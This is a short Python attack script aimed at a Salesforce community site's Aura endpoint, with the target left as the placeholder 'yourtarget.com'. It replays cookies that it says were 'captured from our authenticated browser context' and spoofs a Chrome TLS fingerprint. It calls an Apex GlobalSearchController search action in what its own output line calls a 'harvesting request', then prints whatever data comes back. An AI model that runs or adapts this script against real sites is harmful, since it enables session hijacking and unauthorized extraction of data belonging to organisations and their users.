import json
from curl_cffi import requests

session = requests.Session()
gateway_url = "https://yourtarget.com/help/s/sfsites/aura"

LIVE_FWUID = "ZVYtV2g3NHN0UGNVNzBMbldfZ0ZwZ2tVMjdnTGFERUU2S3FfSVdrcU92bkExNS4zLjE2MDEw"

# Injected cookies captured from our authenticated browser context
cookies = {
    "CookieConsentPolicy": "0:1",
    "renderCtx": "%7B%22pageId%22%3A%22d577c8b1-9ed1-4740-9c26-274b23c4f92e%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%222eba8b1e-f658-499f-bc13-03930626f6cb%22%2C%22audienceIds%22%3A%226Au0Z000000Gmcg%22%7D",
    "JSESSIONID": "0BA2F93115A3D3D80D5276D38BF58B51",
    "idx": "eyJ6aXAiOiJERUYiLCJ2IjoiMS4xIiwidGFnIjoiMS5hIiwiZGF0YSI6ImUJwtZpbnRlcm5hbFVzZXJfX2M9ZmFsc2UifQ"
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json; charset=UTF-8",
    "X-SFDC-Aura-Request": "true"
}

aura_context = json.dumps({
    "mode": "PROD",
    "fwuid": LIVE_FWUID,
    "app": "siteforce:communityApp",
    "loaded": {"APPLICATION@markup://siteforce:communityApp": "1897_Qx6CsUG7r803A_23Hon_1g"}
})

payload = {
    "message": json.dumps({
        "actions": [
            {
                "id": "27;a",
                "descriptor": "apex://GlobalSearchController/ACTION$search",
                "callingDescriptor": "UNKNOWN",
                "params": {"searchTerm": "Okta", "caseId": "500000000000000AAA"}
            }
        ]
    }),
    "aura.context": aura_context,
    "aura.token": "null"
}

print("[*] Dispatching tenant-authenticated harvesting request...")
res = session.post(gateway_url, headers=headers, cookies=cookies, data=json.dumps(payload), impersonate="chrome120", timeout=10)

print(f"[+] Status Code: {res.status_code} | Length: {len(res.text)}")
print(f"[+] Response Output:\n{res.text}")

